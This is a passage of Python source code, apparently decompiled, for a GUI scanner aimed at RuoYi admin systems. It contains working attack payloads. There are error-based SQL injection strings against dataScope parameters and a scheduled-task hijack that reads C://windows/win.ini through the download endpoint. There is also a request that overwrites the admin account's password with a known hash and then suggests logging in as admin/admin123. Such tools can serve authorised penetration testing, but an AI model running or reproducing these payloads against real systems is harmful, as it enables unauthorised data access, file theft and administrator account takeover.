        paths = [f'{base_api}/system/dept/list?dataScope=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))', f'{base_api}/system/role/list?dataScope=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))', f'{base_api}/system/user/list?dataScope=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))', f'{base_api}/system/dept/list?params%5BdataScope%5D=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))', f'{base_api}/system/role/list?params%5BdataScope%5D=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))', f'{base_api}/system/user/list?params%5BdataScope%5D=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))']
        for path in paths:
            self._detect_sql_injection(config, path)

    def _detect_sql_injection(self, config, path):
        url = config['url'].rstrip('/') + path
        try:
            headers = self._build_headers(config)
            resp = requests.get(url, headers=headers, proxies=self._get_proxies(config), timeout=self.timeout, verify=False)
            if 'syntax' in resp.text:
                self._log_result(f'[严重] SQL注入漏洞: {path}', severity='critical')
            else:  # inserted
                self._log_result(f'{path} 漏洞不存在', severity='info')
        except Exception as e:
            self._log_result(f'{path} 检测失败: {str(e)}', severity='warning')

    def check_scheduled_task(self):
        config = self._get_config()
        base_api = self._get_base_api()
        url = f'{base_api}/monitor/job'
        data = {'searchValue': None, 'createBy': 'admin', 'createTime': '2024-01-10 11:11:11', 'updateBy': None, 'updateTime': None, 'remark': '', 'params': {}, 'jobId': 100, 'jobName': 'ruoYiConfig.setProfile', 'jobGroup': 'DEFAULT', 'invokeTarget': 'ruoYiConfig.setProfile(\'C://windows/win.ini\')', 'cronExpression': '0/10 * * * * ?', 'misfirePolicy': '2', 'concurrent': '1', 'status': '1', 'nextValidTime': '2024-01-11 11:11:11'}
        self._detect_endpoint(config, url, method='PUT', data=data)
        verify_url = '/common/download/resource?resource=.jpg'
        self._verify_scheduled_task(config, verify_url)

    def _verify_scheduled_task(self, config, path):
        url = config['url'].rstrip('/') + path
        try:
            headers = self._build_headers(config)
            resp = requests.get(url, headers=headers, proxies=self._get_proxies(config), timeout=self.timeout, verify=False)
            if 'win.ini' in resp.text or '[extensions]' in resp.text:
                self._log_result(f'[严重] 定时任务漏洞存在，文件读取成功: {path}', severity='critical')
            else:  # inserted
                self._log_result(f'{path} 文件读取失败，漏洞可能不存在', severity='info')
        except Exception as e:
            self._log_result(f'{path} 检测失败: {str(e)}', severity='warning')

    def check_password_reset(self):
        config = self._get_config()
        base_api = self._get_base_api()
        url = f'{base_api}/system/user/profile'
        data = {'userId': 1, 'password': '$2a$10$7JB720yubVSZvUI0rEqK/.VqGOZTH.ulu33dHOiBE8ByOhJIrdAu2'}
        self._detect_endpoint(config, url, method='PUT', data=data)

    def _detect_endpoint(self, config, path, keyword=None, method='GET', data=None, severity='critical'):
        url = config['url'].rstrip('/') + path
        try:
            headers = self._build_headers(config)
            if method == 'GET':
                resp = requests.get(url, headers=headers, proxies=self._get_proxies(config), timeout=self.timeout, verify=False)
            else:  # inserted
                if method == 'PUT':
                    headers['Content-Type'] = 'application/json'
                    resp = requests.put(url, json=data, headers=headers, proxies=self._get_proxies(config), timeout=self.timeout, verify=False)
                else:  # inserted
                    raise ValueError('Unsupported HTTP method')
            if keyword:
                if isinstance(keyword, str):
                    if keyword in resp.text:
                        self._log_result(f'{path} 存在漏洞', severity)
                    else:  # inserted
                        self._log_result(f'{path} 漏洞可能不存在', 'info')
                else:  # inserted
                    if callable(keyword):
                        if keyword(resp):
                            self._log_result(f'{path} 存在漏洞', severity)
                        else:  # inserted
                            self._log_result(f'{path} 漏洞可能不存在', 'info')
            else:  # inserted
                if resp.status_code == 200:
                    if 'monitor/job' in path:
                        self._log_result(f'{path} 请求成功——定时任务可能存在漏洞', severity)
                    else:  # inserted
                        if 'system/user/profile' in path:
                            self._log_result(f'{path} 请求成功——重置密码可能存在漏洞，尝试登录admin/admin123', severity)
                        else:  # inserted
                            self._log_result(f'{path} 请求成功', severity)
                else:  # inserted
                    self._log_result(f'{path} 漏洞可能不存在', 'info')
        except Exception as e:
            self._log_result(f'{path} 请求失败: {str(e)}', 'warning')

    def full_scan(self):
        if self.scanning:
            messagebox.showwarning('警告', '已有扫描任务正在进行，请稍后再试！')
        else:  # inserted
            self.scanning = True
            threading.Thread(target=self._full_scan_thread).start()

    def _full_scan_thread(self):
        self.clear_results()
        self.status_bar.config(text='正在执行全面检测...')
        methods = [self.check_swagger, self.check_druid, self.check_file_download, self.check_sql_injection, self.check_scheduled_task, self.check_password_reset]
        total_steps = len(methods)
        for i, method in enumerate(methods):
            if not self.scanning:
                break
            self._update_progress(i, total_steps)
            method()
        self.progress_bar['value'] = 100
        self.progress_label.config(text='扫描进度: 100%')
        self.status_bar.config(text='全面检测完成')
        self.scanning = False

    def _update_progress(self, current, total):
        """更新进度条和状态栏"""  # inserted
        if total > 0:
            percentage = int(current / total * 100)
            self.progress_bar['value'] = percentage
            self.status_bar.config(text=f'进度: {current}/{total} ({percentage}%)')
            self.update_idletasks()

    def stop_scan(self):
        self.scanning = False
        self.status_bar.config(text='扫描已停止')

    def clear_results(self):
        self.result_area.delete(1.0, tk.END)
        self.progress_bar['value'] = 0
        self.progress_label.config(text='扫描进度: 0%')
if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings()
    app = RuoYiScannerPro()
    app.mainloop()